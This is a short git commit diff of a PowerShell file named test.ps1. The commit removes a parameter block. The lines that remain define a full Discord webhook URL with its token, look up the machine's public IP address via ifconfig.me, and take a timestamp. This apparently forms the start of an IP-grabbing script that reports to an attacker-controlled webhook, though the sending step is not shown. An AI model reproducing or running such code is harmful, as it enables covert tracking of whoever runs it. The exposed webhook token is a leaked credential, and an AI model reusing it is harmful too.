918dea3a6a1a98f96929bcdb56397570cdc36cd5
Peach-Iced-Tea <134111163+Peach-Iced-Tea@users.noreply.github.com>
2024-08-27 13:54:13 +0200

    Update test.ps1
    Removed parameters from script

--- test.ps1
+++ test.ps1
@@ -1,7 +1,3 @@
-param (
-  [string]$var1
-)
-
 $URL = "https://discordapp.com/api/webhooks/1276442521689395220/CnXvgEAYbwkbYIOC1ZOkG_wmf-2my3mRSQv7Xip6WM3FCRfrjYOctTAe3FKtI8uEs9HS"
 $IP = Invoke-WebRequest("ifconfig.me")
 $cTime = Get-Date -Format "MM/dd - HH:mm:ss"
